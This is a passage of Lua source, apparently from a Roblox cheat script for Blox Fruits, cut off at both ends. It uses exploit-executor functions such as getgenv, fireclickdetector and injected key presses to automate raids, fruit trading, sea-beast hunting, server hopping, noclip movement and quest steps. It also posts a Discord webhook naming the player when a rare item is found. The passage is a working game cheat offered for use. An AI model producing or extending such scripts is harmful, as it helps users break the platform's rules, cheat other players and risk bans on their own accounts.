                                if isFruitsInInventory() then
                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("RaidsNpc", "Check")
                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("RaidsNpc", "Select", SelectedChip)
                                    wait(5)
                                    if not isChipInInventory() and isFruitsInInventory() and not isRaiding() then
                                        FakeFruit = true
                                    end
                                else
                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("RaidsNpc", "Check")
                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("RaidsNpc", "Select", SelectedChip)
                                end
                            end
                        end
                    end
                end)
            end
        end)
        autotradejunk = RaidSection:NewToggle("Auto Trade Fruit < 1M", function(state)
            getgenv().EuphoriaSettings["autotradejunk"] = state
            WriteSettings()
        end)
        if getgenv().EuphoriaSettings["autotradejunk"] then autotradejunk:UpdateToggle(nil, true) end
        function getCheapestFruit()
            local fruits = {
                "Rocket-Rocket",
                "Spin-Spin",
                "Chop-Chop",
                "Spring-Spring",
                "Bomb-Bomb",
                "Smoke-Smoke",
                "Spike-Spike",
                "Flame-Flame",
                "Falcon-Falcon",
                "Ice-Ice",
                "Sand-Sand",
                "Dark-Dark",
                "Diamond-Diamond",
                "Light-Light",
                "Rubber-Rubber",
                "Barrier-Barrier",
                "Ghost-Ghost",
                "Magma-Magma"
            }
            myFruits = {}
            for i,v in pairs(ReplicatedStorage.Remotes["CommF_"]:InvokeServer("getInventoryFruits")) do
                table.insert(myFruits, v.Name)
            end
            for _, fr in pairs(fruits) do
                for _, f in pairs(myFruits) do
                    if fr == f then return fr end
                end
            end
            return 0
        end
        function getUnusable1MFruit()
            local fruits = {
                "Quake-Quake",
                "Love-Love",
                "Phoenix-Phoenix",
                "Spider-Spider",
                "Pain-Pain",
                "Gravity-Gravity",
                "Sound-Sound",
            }
            local myFruits = {}
            for i,v in pairs(ReplicatedStorage.Remotes["CommF_"]:InvokeServer("getInventoryFruits")) do
                table.insert(myFruits, v.Name)
            end
            for _, fr in pairs(fruits) do
                for _, f in pairs(myFruits) do
                    if fr == f then return fr end
                end
            end
            return 0
        end
        task.spawn(function()
            while task.wait() do
                pcall(function()
                    task.wait(4)
                    if getgenv().EuphoriaSettings["autotradejunk"] and not BlockRaids and getgenv().EuphoriaSettings["autobuychip"] and not isFruitsInInventory() then
                        if isItemInEquip("Special Microchip") then
                            _G.ChipConsumedRecently = false
                            _G.HadAChip = true
                        end
                        if not isItemInEquip("Special Microchip") and _G.HadAChip then
                            _G.HadAChip = false
                            _G.ChipConsumedRecently = true
                            task.wait(5)
                            _G.ChipConsumedRecently = false
                        end
                    end
                end)
            end
        end)
        task.spawn(function()
            while task.wait() do
                pcall(function()
                    task.wait(5)
                    if getgenv().EuphoriaSettings["autotradejunk"] and not BlockRaids then
                        if isItemInEquip("Special Microchip") then curFrag = curFrag + 1000 end
                        if LP.PlayerGui.Main.Timer.Visible or isIslandNearest() then curFrag = curFrag + 1000 end
                        if not getgenv().EuphoriaSettings["enabledmaxfrag"] or curFrag < getgenv().EuphoriaSettings["maxfrag"] then
                            if not isItemInEquip("Special Microchip") and not _G.ChipConsumedRecently then
                                cheapest = getCheapestFruit()
                                if cheapest ~= 0 then
                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("LoadFruit", cheapest)
                                end
                            end
                        end
                    end
                end)
            end
        end)
        AutoFarmFruitsForRaid = false
        AutoFarmFruitsForRaidToggle = RaidSection:NewToggle("Farm Fruits For Raid [ Experimental ]", function(state)
            getgenv().EuphoriaSettings["Auto Farm Fruits For Raid"] = state
            WriteSettings()
            AutoFarmFruitsForRaid = state
        end)
        if getgenv().EuphoriaSettings["Auto Farm Fruits For Raid"] then AutoFarmFruitsForRaidToggle:UpdateToggle(nil, true) end
        
        BlockRaids = false
        SkipFruits = false
        spawn(function()
            while wait() do
                local s,e = pcall(function()
                    if AutoFarmFruitsForRaid and getgenv().EuphoriaSettings["autobuychip"] then
                        if isFruitsOnServer() and not isRaiding() then
                            BlockRaids = true
                            _G.AutoFarmFruitsSafe = true
                            _G.AutoStoreFruit = true
                        else
                            if isWorthFruitInInventory() and not SkipFruits then
                                storeAllWorthFruits()
                                if isWorthFruitInInventory() then
                                    SkipFruits = true
                                end
                            else
                                _G.AutoFarmFruitsSafe = false
                                if isCheapFruitsInInventory() or isFruitsInInventory() or isChipInInventory() then
                                    if FakeFruit then 
                                        HopToLowestServer()
                                    end
                                    BlockRaids = false
                                    _G.AutoStoreFruit = false
                                else
                                    if not isRaiding() and not isChipInInventory() and not isCheapFruitsInInventory() and not isFruitsInInventory() then
                                        wait(5)
                                        if not isRaiding() and not isChipInInventory() and not isCheapFruitsInInventory() and not isFruitsInInventory() then
                                            HopToLowestServer()
                                        end
                                    end
                                end
                            end
                        end
                    else
                        BlockRaids = false
                    end
                end)
                if e then print(e) end
            end
        end)

        autoawakefruit = RaidSection:NewToggle("Auto Awake Fruit", function(state)
            getgenv().EuphoriaSettings["autoawakefruit"] = state
            WriteSettings()
        end)
        if getgenv().EuphoriaSettings["autoawakefruit"] then autoawakefruit:UpdateToggle(nil, true) end
        task.spawn(function()
            while task.wait() do 
                pcall(function()
                    task.wait(1)
                    if getgenv().EuphoriaSettings["autoawakefruit"] then
                        ReplicatedStorage.Remotes.CommF_:InvokeServer("Awakener", "Check")
                        ReplicatedStorage.Remotes.CommF_:InvokeServer("Awakener", "Awaken")
                    end
                end)
            end
        end)
        MaxFragmentSlider = RaidSection:NewSlider("Max FRAG", 0, 20000, function(s)
            getgenv().EuphoriaSettings["maxfrag"] = s
            WriteSettings()
        end)
        if getgenv().EuphoriaSettings["maxfrag"] then
            MaxFragmentSlider:UpdateValue(getgenv().EuphoriaSettings["maxfrag"])
        end
        MaxFragmentToggle = RaidSection:NewToggle("Enable Max Fragments", function(state)
            getgenv().EuphoriaSettings["enabledmaxfrag"] = state
            WriteSettings()
        end)
        if getgenv().EuphoriaSettings["enabledmaxfrag"] then MaxFragmentToggle:UpdateToggle(nil, true) end


        
        RaidSection:NewLabel(" ")
        ChipDropdown = RaidSection:NewDropdown("Selected Chip", {"Flame","Ice","Dough","Buddha","Magma","Quake","Light","Dark","Spider","Rumble","Sand","Phoenix"}, function(chip)
            SelectedChip = chip
            getgenv().EuphoriaSettings["Selected Chip"] = chip
            WriteSettings()
        end)
        if getgenv().EuphoriaSettings["Selected Chip"] then
            ChipDropdown:UpdateSelect(getgenv().EuphoriaSettings["Selected Chip"])
        end
        RaidSection:NewButton("Buy Selected Chip", function()
            ReplicatedStorage.Remotes.CommF_:InvokeServer("RaidsNpc", "Check")
            ReplicatedStorage.Remotes.CommF_:InvokeServer("RaidsNpc", "Select", SelectedChip)
        end)
        RaidSection:NewButton("Start Left Side Raid", function()
            if second_sea then
                buttonPos = Vector3.new(-6488.0185546875, 248.6365203857422, -4527.62158203125)
                for i, child in pairs(game:GetService("Workspace").Map.CircleIsland:GetChildren()) do
                    if child.Name == "RaidSummon2" then
                        if (child.Button:GetPivot().Position - buttonPos).Magnitude < 15 then
                            fireclickdetector(child.Button.Main.ClickDetector) 
                        end
                    end
                end
            end
            if third_sea then
                buttonPos = Vector3.new(-5094.7915, 322.691223, -2948.08862)
                for i, child in pairs(game:GetService("Workspace").Map["Boat Castle"]:GetChildren()) do
                    if child.Name == "RaidSummon2" then
                        if (child.Button:GetPivot().Position - buttonPos).Magnitude < 15 then
                            fireclickdetector(child.Button.Main.ClickDetector) 
                        end
                    end
                end
            end
        end)
        RaidSection:NewButton("Start Right Side Raid", function()
            if second_sea then
                buttonPos = Vector3.new(-6465.17138671875, 248.6365203857422, -4452.00048828125)
                for i, child in pairs(game:GetService("Workspace").Map.CircleIsland:GetChildren()) do
                    if child.Name == "RaidSummon2" then
                        if (child.Button:GetPivot().Position - buttonPos).Magnitude < 15 then
                            fireclickdetector(child.Button.Main.ClickDetector) 
                        end
                    end
                end
            end
            if third_sea then
                buttonPos = Vector3.new(-5006.56641, 322.691223, -2983.73389)
                for i, child in pairs(game:GetService("Workspace").Map["Boat Castle"]:GetChildren()) do
                    if child.Name == "RaidSummon2" then
                        if (child.Button:GetPivot().Position - buttonPos).Magnitude < 15 then
                            fireclickdetector(child.Button.Main.ClickDetector) 
                        end
                    end
                end
            end
        end)


        RaidSection:NewLabel(" ")
        TeammateCount = 1
        TeammateCountSlider = RaidSection:NewSlider("Teammates count", 1,3, function(count)
            getgenv().EuphoriaSettings["Teammates count raid"] = count
            WriteSettings()
            TeammateCount = count
        end)
        if getgenv().EuphoriaSettings["Teammates count raid"] then TeammateCountSlider:UpdateValue(getgenv().EuphoriaSettings["Teammates count raid"]) end
        AutoStartWithTeammatesToggle = RaidSection:NewToggle("Auto Start With Teammates", function(state)
            getgenv().EuphoriaSettings["Auto Start With Teammates"] = state
            WriteSettings()
        end)
        if getgenv().EuphoriaSettings["Auto Start With Teammates"] then AutoStartWithTeammatesToggle:UpdateToggle(nil, true) end
        spawn(function()
            while wait() do
                pcall(function()
                    if getgenv().EuphoriaSettings["Auto Start With Teammates"] then
                        AutoStartWithTeammates = true
                    else
                        AutoStartWithTeammates = false 
                    end
                end)
            end
        end)
        spawn(function()
            while wait() do
                pcall(function()
                    if AutoStartWithTeammates and second_sea then
                        if isItemInEquip("Special Microchip") and LP:GetAttribute("IslandRaiding") == false then
                            buttonPos = Vector3.new(-6465.17138671875, 248.6365203857422, -4452.00048828125)
                            for i, child in pairs(game:GetService("Workspace").Map.CircleIsland:GetChildren()) do
                                if child.Name == "RaidSummon2" then
                                    if (child.Button:GetPivot().Position - buttonPos).Magnitude < 15 then
                                        count = 0
                                        if child.Raid1.Color.BrickColor == BrickColor.new("Lime green") then
                                            count = count + 1
                                        end
                                        if child.Raid2.Color.BrickColor == BrickColor.new("Lime green") then
                                            count = count + 1
                                        end
                                        if child.Raid3.Color.BrickColor == BrickColor.new("Lime green") then
                                            count = count + 1
                                        end
                                        if count >= TeammateCount then 
                                            fireclickdetector(child.Button.Main.ClickDetector) 
                                        end
                                    end
                                end
                            end
                        end
                    end
                end)
            end
        end)

        RaidTeammateCell = "1"
        RaidTeammateCellDropdown = RaidSection:NewDropdown("Teammate Cell", {"1","2","3"}, function(choice)
            getgenv().EuphoriaSettings["Raid Teammate Cell"] = choice
            WriteSettings()
            RaidTeammateCell = choice
        end)
        if getgenv().EuphoriaSettings["Raid Teammate Cell"] then RaidTeammateCellDropdown:UpdateSelect(getgenv().EuphoriaSettings["Raid Teammate Cell"]) end
        AutoTweenToTeammateCellToggle = RaidSection:NewToggle("Auto Tween to Teammate Cell", function(state)
            getgenv().EuphoriaSettings["Auto Tween To Mate Cell"] = state
            WriteSettings()
        end)
        if getgenv().EuphoriaSettings["Auto Tween To Mate Cell"] then AutoTweenToTeammateCellToggle:UpdateToggle(nil, true) end
        spawn(function()
            while wait() do
                pcall(function()
                    if getgenv().EuphoriaSettings["Auto Tween To Mate Cell"] then
                        AutoTweenToTeammateCell = true
                    else
                        AutoTweenToTeammateCell = false 
                    end
                end)
            end
        end)
        spawn(function()
            while wait() do
                pcall(function()
                    if AutoTweenToTeammateCell then
                        if second_sea and LP:GetAttribute("IslandRaiding") == false then
                            if RaidTeammateCell == "1" then
                                cf = CFrame.new(-6433.14111, 263.036926, -4487.99854, -0.188667357, -8.16385324e-08, -0.982041061, -6.53594086e-08, 1, -7.05747993e-08, 0.982041061, 5.08704616e-08, -0.188667357)
                            elseif RaidTeammateCell == "2" then
                                cf = CFrame.new(-6439.01123, 263.037003, -4474.97168, -0.998393476, -2.55918717e-08, 0.0566606596, -2.63134812e-08, 1, -1.19895569e-08, -0.0566606596, -1.34612348e-08, -0.998393476)
                            elseif RaidTeammateCell == "3" then
                                cf = CFrame.new(-6445.36426, 263.036942, -4461.86426, -0.999648929, -8.89500651e-09, -0.0264959689, -8.67375594e-09, 1, -8.46528447e-09, 0.0264959689, -8.23249291e-09, -0.999648929)
                            end
                            useNearestEntrance(cf)
                            toPoint(cf)
                        end
                    end
                end)
            end
        end)

        RaidSection:NewButton("Tween to raid room", function()
            if second_sea then
                if RaidTeammateCell == "1" then
                    cf = CFrame.new(-6433.14111, 253.036926, -4487.99854, -0.188667357, -8.16385324e-08, -0.982041061, -6.53594086e-08, 1, -7.05747993e-08, 0.982041061, 5.08704616e-08, -0.188667357)
                elseif RaidTeammateCell == "2" then
                    cf = CFrame.new(-6439.01123, 253.037003, -4474.97168, -0.998393476, -2.55918717e-08, 0.0566606596, -2.63134812e-08, 1, -1.19895569e-08, -0.0566606596, -1.34612348e-08, -0.998393476)
                elseif RaidTeammateCell == "3" then
                    cf = CFrame.new(-6445.36426, 253.036942, -4461.86426, -0.999648929, -8.89500651e-09, -0.0264959689, -8.67375594e-09, 1, -8.46528447e-09, 0.0264959689, -8.23249291e-09, -0.999648929)
                end
                NoClip = true
                if useNearestEntrance(cf) then
                    StopTween()
                    wait()
                end
                toPoint(cf)

                NoClip = false
            end
        end)
        
        local SeaEventTab = Window:NewTab("Sea Event")
        if second_sea then
            local Sea2EventSection = SeaEventTab:NewSection("Sea 2")
            sea2SeaBeast = nil
            spawn(function()
                while wait() do
                    local _, ee123 = pcall(function()
                        if sea2SeaBeast and (AutoSeaBeast or AutoV3Race or AutoSeaBeastRaceV3) then
                            dismountBoat()
                            repeat wait()
                                toTarget(CFrame.new(sea2SeaBeast.HumanoidRootPart.CFrame.X, 60, sea2SeaBeast.HumanoidRootPart.CFrame.Z) * RandomOffsetCFrameSeaBeast())
                            until not workspace.SeaBeasts:GetChildren() or not sea2SeaBeast or not sea2SeaBeast.Parent or sea2SeaBeast.Health.Value <= 0 or not (AutoSeaBeast or AutoV3Race or AutoSeaBeastRaceV3)
                        end
                    end)
                    if ee123 then print(ee123) end
                end
            end)
            function spawnSeaBeastSecondSea()
                if #workspace.SeaBeasts:GetChildren() > 0 then
                    dismountBoat()
                    sea2SeaBeast = workspace.SeaBeasts:GetChildren()[1]
                    repeat wait()
                        if getDistance(CFrame.new(sea2SeaBeast.HumanoidRootPart.CFrame.X, 60, sea2SeaBeast.HumanoidRootPart.CFrame.Z)) < 200 then
                            AvailableTools = {}
                            if LP.Data.Stats.Melee.Level.Value > 500 then
                                table.insert(AvailableTools, "Melee")
                            end
                            if LP.Data.Stats["Demon Fruit"].Level.Value > 500 then  
                                table.insert(AvailableTools, "Blox Fruit")
                            end
                            if LP.Data.Stats.Sword.Level.Value > 500 then
                                table.insert(AvailableTools, "Sword")
                            end
                            if LP.Data.Stats.Gun.Level.Value > 500 then
                                table.insert(AvailableTools, "Gun")
                            end
                            for _,cTool in pairs(LP.Backpack:GetChildren()) do
                                canUseThis = false
                                if cTool.Name == "Buddha-Buddha" or cTool.Name == "Portal-Portal" or cTool.Name == "Control-Control" then
                                    local skipFruitShit = 0
                                else
                                    for _,x in AvailableTools do
                                        if cTool.ToolTip == x then
                                            canUseThis = true
                                        end
                                    end
                                    if canUseThis then
                                        LP.Character.Humanoid:EquipTool(cTool)
                                        wait(.01)
                                        AttackSkill(sea2SeaBeast, CFrame.new(sea2SeaBeast.HumanoidRootPart.CFrame.X, 20, sea2SeaBeast.HumanoidRootPart.CFrame.Z))
                                    end
                                end
                            end
                        end
                    until not workspace.SeaBeasts:GetChildren() or not sea2SeaBeast or not sea2SeaBeast.Parent or sea2SeaBeast.Health.Value <= 0 or not (AutoSeaBeast or AutoV3Race or AutoSeaBeastRaceV3)
                    sea2SeaBeast = nil
                else
                    local myBoat = getMyBoat()
                    if not myBoat then
                        dealerPos = CFrame.new(92.5502396, 10.6198282, 2951.39673, 0.487601638, 1.91904554e-08, 0.873066247, 3.86592411e-08, 1, -4.3571454e-08, -0.873066247, 5.49975887e-08, 0.487601638)
                        if getDistance(dealerPos) > 8 then
                            if useNearestEntrance(dealerPos) then
                                StopTween()
                            end
                            toPoint(dealerPos)
                        else
                            buyBoat()
                        end         
                        wait(.05)
                        if getMyBoat() then
                            repeat wait()
                                toBoat()
                            until (getMyBoat() and getMyBoat().VehicleSeat:FindFirstChild("SeatWeld")) or not (AutoSeaBeast or AutoV3Race or AutoSeaBeastRaceV3)
                        end
                    else
                        if not getMyBoat().VehicleSeat:FindFirstChild("SeatWeld") then
                            repeat wait()
                                toBoat()
                            until (getMyBoat() and getMyBoat().VehicleSeat:FindFirstChild("SeatWeld")) or not (AutoSeaBeast or AutoV3Race or AutoSeaBeastRaceV3)
                        else
                            seaBeastPositions = {
                                CFrame.new(2311.28125, 29.00471854163, 4551.17969, -0.468381822, 3.78733755e-09, -0.883526146, 1.43722705e-08, 1, -3.3325247e-09, 0.883526146, -1.42591707e-08, -0.468381822),
                                CFrame.new(3300.83813, 29.0047186017, 12000.30615, -0.829926491, 1.25665371e-08, -0.557872713, 1.13241205e-09, 1, 2.08411652e-08, 0.557872713, 1.66648935e-08, -0.829926491),
                                CFrame.new(1143.73315, 29.0047185421, 15000.06543, -0.757509232, -3.84969887e-08, 0.652824461, -6.23937879e-08, 1, -1.34291565e-08, -0.652824461, -5.09049016e-08, -0.757509232),
                                CFrame.new(-3000.4198, 29.0047186017, 5000.58301, 0.514693201, 1.09758584e-08, 0.85737443, 1.14106964e-08, 1, -1.96517007e-08, -0.85737443, 1.98978363e-08, 0.514693201)                            
                            }
                            for _,seaBeastPos in ipairs(seaBeastPositions) do
                                if not getMyBoat().VehicleSeat:FindFirstChild("SeatWeld") then
                                    break
                                end
                                repeat wait()
                                    tweenBoat(seaBeastPos)
                                until getDistance(seaBeastPos) < 100 or #workspace.SeaBeasts:GetChildren() > 0 or not (AutoSeaBeast or AutoV3Race or AutoSeaBeastRaceV3)
                            end
                        end
                    end
                end
            end

            AutoSeaBeastToggle = Sea2EventSection:NewToggle("Auto Sea Beast", function(state)
                getgenv().EuphoriaSettings["Auto Sea Beast"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Sea Beast"] then AutoSeaBeastToggle:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if second_sea and getgenv().EuphoriaSettings["Auto Sea Beast"] then
                            AutoSeaBeast = true
                        else
                            AutoSeaBeast = false
                        end
                    end)
                end
            end)
            spawn(function()
                while task.wait() do
                    pcall(function()
                        if second_sea and (AutoSeaBeast or AutoSeaBeastRaceV3) then
                            spawnSeaBeastSecondSea()
                        end
                    end)
                end
            end)
        end
        if third_sea then 
            local MirageSection = SeaEventTab:NewSection("Mirage")
            DialogueStatus = MirageSection:NewLabel("Blue Gear: Loading")
            spawn(function()
                while wait(2) do
                    pcall(function()
                        if PlayerData.BlueGear then
                            DialogueStatus:UpdateLabel("Blue Gear: ✅")
                            return
                        end
                        if GetMaterial("Mirror Fractal") <= 0 or not isAccessoryInInventory("Valkyrie Helm") then
                            tex = "Need to get"
                            if GetMaterial("Mirror Fractal") <= 0 and not isAccessoryInInventory("Valkyrie Helm") then
                                tex = tex .. " Mirror Fractal and Valkyrie Helm ❌"
                            elseif not isAccessoryInInventory("Valkyrie Helm") then
                                tex = tex .. " Valkyrie Helm ❌"
                            elseif GetMaterial("Mirror Fractal") <= 0 then
                                tex = tex .. " Mirror Fractal ❌"
                            end
                            DialogueStatus:UpdateLabel("Blue Gear: " .. tex)
                            return
                        end 
                        if PlayerData.RaceVer ~= "V3" then
                            DialogueStatus:UpdateLabel("Blue Gear: Need to get V3 Race ❌")
                            return
                        end
                        if PlayerData.V4Status == 1 then
                            DialogueStatus:UpdateLabel("Blue Gear: Need complete dialog (1/4) ❌")
                        elseif PlayerData.V4Status == 2 then
                            DialogueStatus:UpdateLabel("Blue Gear: Need complete dialog (2/4) ❌")
                        elseif PlayerData.V4Status == 3 then
                            DialogueStatus:UpdateLabel("Blue Gear: Need complete dialog (3/4) ❌")
                        elseif PlayerData.V4Status == 4 then
                            DialogueStatus:UpdateLabel("Blue Gear: Need to get Blue Gear ❌")
                        end
                    end)
                    if PlayerData.BlueGear then break end
                end
            end)
            
            MirageIslandDistance = MirageSection:NewLabel("Mirage Distance: ")
            spawn(function()
                while wait() do
                    pcall(function()
                        if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then
                            MirageIslandDistance:UpdateLabel("Mirage Spawned: ✅ | " .. tostring(math.floor(getDistance(CFrame.new(game:GetService("Workspace").Map.MysticIsland.Center.Position.X,500,game:GetService("Workspace").Map.MysticIsland.Center.Position.Z)))) .. "m (" .. tostring(math.floor(getDistance(CFrame.new(game:GetService("Workspace").Map.MysticIsland.Center.Position.X,500,game:GetService("Workspace").Map.MysticIsland.Center.Position.Z)) / _G.TweenSpeed)) .. " +- seconds)")
                        else
                            MirageIslandDistance:UpdateLabel("Mirage Spawned: ❌")
                        end
                    end)
                end
            end)

            AutoLockMoon = MirageSection:NewToggle("Auto Lock Moon", function(state)
                getgenv().EuphoriaSettings["Auto Lock Moon"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Lock Moon"] then AutoLockMoon:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Auto Lock Moon"] and game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then _G.AutoLockMoon = true else _G.AutoLockMoon = false end
                    end)
                end
            end)

            spawn(function()
                while wait() do
                    pcall(function()
                        if _G.AutoLockMoon then
                            workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.Position,game:GetService("Lighting"):GetMoonDirection() + workspace.CurrentCamera.CFrame.Position)
                        end                
                    end)
                end
            end)
            
            
            TweenToMirage = MirageSection:NewToggle("Tween to Mirage [ if exists ]", function(state)
                getgenv().EuphoriaSettings["Tween to mirage"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Tween to mirage"] then TweenToMirage:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Tween to mirage"] and game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then _G.TweenToMirage = true else _G.TweenToMirage = false end
                    end)
                end
            end)
            spawn(function()
                while wait() do
                    pcall(function()
                        if _G.TweenToMirage then
                            StopTween()
                            if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then
                                repeat wait()
                                    toPoint(CFrame.new(game:GetService("Workspace").Map.MysticIsland.Center.Position.X,500,game:GetService("Workspace").Map.MysticIsland.Center.Position.Z))
                                until not game:GetService("Workspace").Map:FindFirstChild("MysticIsland") or not _G.TweenToMirage
                            end
                        end
                    end)
                end
            end)

            TweenToGear = MirageSection:NewToggle("Tween to Gear", function(state)
                getgenv().EuphoriaSettings["Tween to Gear"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Tween to Gear"] then TweenToGear:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Tween to Gear"] and game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then _G.TweenToGear = true else _G.TweenToGear = false end
                    end)
                end
            end)
            spawn(function()
                pcall(function()
                    while wait() do
                        if _G.TweenToGear then
                            if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then
                                for i,v in pairs(game:GetService("Workspace").Map.MysticIsland:GetChildren()) do 
                                    if v:IsA("MeshPart")then 
                                        if v.Material == Enum.Material.Neon then  
                                            toPoint(v.CFrame)
                                        end
                                    end
                                end
                            end
                        end
                    end 
                end)
            end)
            
            MirageSection:NewLabel(" ")
            AutoGearBoat = MirageSection:NewToggle("Auto Blue Gear [ Spawn Mirage ]", function(state)
                getgenv().EuphoriaSettings["Auto Gear Boat"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Gear Boat"] then AutoGearBoat:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Auto Gear Boat"] then 
                            _G.AutoGearBoat = true 
                        else 
                            _G.AutoGearBoat = false 
                            _G.BoatingMirage = false
                        end
                    end)
                end
            end)
            spawn(function()
                while wait() do
                    if _G.BlueGear then break end
                    pcall(function()
                        if GetMaterial("Mirror Fractal") == 0 or not isAccessoryInInventory("Valkyrie Helm") then
                            return
                        end
                        if PlayerData.BlueGear then
                            return
                        end
                        if getgenv().EuphoriaSettings["Auto Gear Boat"] and tonumber(PlayerData.V4Status) ~= 4 and GetMaterial("Mirror Fractal") > 0 and isAccessoryInInventory("Valkyrie Helm") then
                            if tonumber(PlayerData.V4Status) == 1 then
                                ReplicatedStorage.Remotes.CommF_:InvokeServer("RaceV4Progress","Begin")
                                return
                            end
                            if tonumber(PlayerData.V4Status) == 2 then
                                if getDistance(CFrame.new(28609.8984, 14896.5322, 106.336395, 0.0235749353, -9.18887295e-08, -0.999722064, 4.15164472e-08, 1, -9.09352522e-08, 0.999722064, -3.93611153e-08, 0.0235749353)) > 500 then
                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(28282.5703125, 14896.8505859375, 105.1042709350586))
                                    toPoint(CFrame.new(28609.8984, 14896.5322, 106.336395, 0.0235749353, -9.18887295e-08, -0.999722064, 4.15164472e-08, 1, -9.09352522e-08, 0.999722064, -3.93611153e-08, 0.0235749353))
                                    return
                                else
                                    if getDistance(CFrame.new(28609.6914, 14896.5332, 106.819748, 0.211734429, -3.73081122e-09, -0.977327228, -4.00236644e-09, 1, -4.68445993e-09, 0.977327228, 4.9034834e-09, 0.211734429)) < 20 then
                                        wait(1)
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("RaceV4Progress","TeleportBack")
                                        wait(.5)
                                        toPoint(CFrame.new(2956.01245, 2282.23022, -7215.73926, 0.526488245, -3.62312811e-08, -0.850182414, -4.38758612e-08, 1, -6.97866724e-08, 0.850182414, 7.40443511e-08, 0.526488245))
                                        ReplicatedStorage.Remotes.CommF_:InvokeServer("RaceV4Progress","Teleport")
                                    end
                                    return
                                end
                                return
                            end
                            ReplicatedStorage.Remotes.CommF_:InvokeServer("RaceV4Progress","Continue")
                            return
                        end
                        if _G.AutoGearBoat then
                            if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") and tonumber(PlayerData.V4Status) == 4 then
                                _G.BoatingMirage = false
                                repeat wait()
                                    dismountBoat()
                                    stopBoat()
                                    MiragePoint = CFrame.new(game:GetService("Workspace").Map.MysticIsland.Center.Position.X,500,game:GetService("Workspace").Map.MysticIsland.Center.Position.Z)
                                    if useNearestEntrance(MiragePoint) then
                                        StopTween()
                                    end
                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                    toPoint(MiragePoint)
                                    gearFound = false
                                    for i,v in pairs(game:GetService("Workspace").Map.MysticIsland:GetChildren()) do 
                                        if v:IsA("MeshPart") then 
                                            if v.Material == Enum.Material.Neon and v.Transparency == 0 then  
                                                gearFound = v
                                            end
                                        end
                                    end
                                    if not gearFound then
                                        if PlayerData.BlueGear then
                                            return
                                        end
                                        if getDistance(MiragePoint) < 200 and IsNight() then
                                            workspace.CurrentCamera.CFrame = CFrame.new(workspace.CurrentCamera.CFrame.Position,game:GetService("Lighting"):GetMoonDirection() + workspace.CurrentCamera.CFrame.Position)
                                            game:service('VirtualInputManager'):SendKeyEvent(true, "I", false, game)
                                            game:service('VirtualInputManager'):SendKeyEvent(false, "I", false, game)
                                            game:service('VirtualInputManager'):SendKeyEvent(true, "I", false, game)
                                            game:service('VirtualInputManager'):SendKeyEvent(false, "I", false, game)
                                            game:service('VirtualInputManager'):SendKeyEvent(true, "I", false, game)
                                            game:service('VirtualInputManager'):SendKeyEvent(false, "I", false, game)
                                            game:service('VirtualInputManager'):SendKeyEvent(true, "I", false, game)
                                            game:service('VirtualInputManager'):SendKeyEvent(false, "I", false, game)
                                            game:service('VirtualInputManager'):SendKeyEvent(true, "T", false, game)
                                            game:service('VirtualInputManager'):SendKeyEvent(false, "T", false, game)
                                        end
                                    else
                                        repeat wait()
                                            toPoint(gearFound.CFrame)
                                        until not gearFound or not gearFound.Parent or gearFound.Transparency == 1 or not _G.AutoGearBoat
                                        game:service('VirtualInputManager'):SendKeyEvent(true, "O", false, game)
                                        game:service('VirtualInputManager'):SendKeyEvent(false, "O", false, game)
                                        game:service('VirtualInputManager'):SendKeyEvent(true, "O", false, game)
                                        game:service('VirtualInputManager'):SendKeyEvent(false, "O", false, game)
                                        game:service('VirtualInputManager'):SendKeyEvent(true, "O", false, game)
                                        game:service('VirtualInputManager'):SendKeyEvent(false, "O", false, game)
                                        game:service('VirtualInputManager'):SendKeyEvent(true, "O", false, game)
                                    end
                                until not game:GetService("Workspace").Map:FindFirstChild("MysticIsland") or not _G.AutoGearBoat
                            else
                                _G.BoatingMirage = true
                            end
                        end
                    end)
                end
            end)

            spawn(function()
                repeat wait() until PlayerData.BlueGear ~= nil
                if PlayerData.BlueGear then
                    return
                end
                local st, err = pcall(function()
                    repeat wait() until PlayerData.BlueGear
                    local Embed = {
                        ["title"] = LP.Name,
                        ["description"] = "```py\nBLUE GEAR FOUND```",
                        ["type"] = "rich",
                        ["color"] = tonumber(0xffffff),
                        ["footer"] = {
                            ["text"] = "e u p h o r i a =3",
                        }
                    };
                    sendWebhook(
                        webhook['misc_webhook'],
                        "@here",
                        Embed 
                    )
                end)
                if err then print(err) end
            end)

            spawn(function()
                while wait() do
                    local sa, ea = pcall(function()
                        if third_sea and _G.BoatingMirage then
                            BoatPos = CFrame.new(-16208.5752, 9.08636189, 407.685608, 0.87449646, 1.22196955e-08, -0.485031873, 2.7691156e-08, 1, 7.51198357e-08, 0.485031873, -7.91231187e-08, 0.87449646)
                            TikiPos = CFrame.new(-16207.3916, 9.08636189, 442.4935, -0.289960057, 1.5374928e-09, -0.95703876, 1.00728599e-07, 1, -2.89118667e-08, 0.95703876, -1.04784462e-07, -0.289960057)
                            
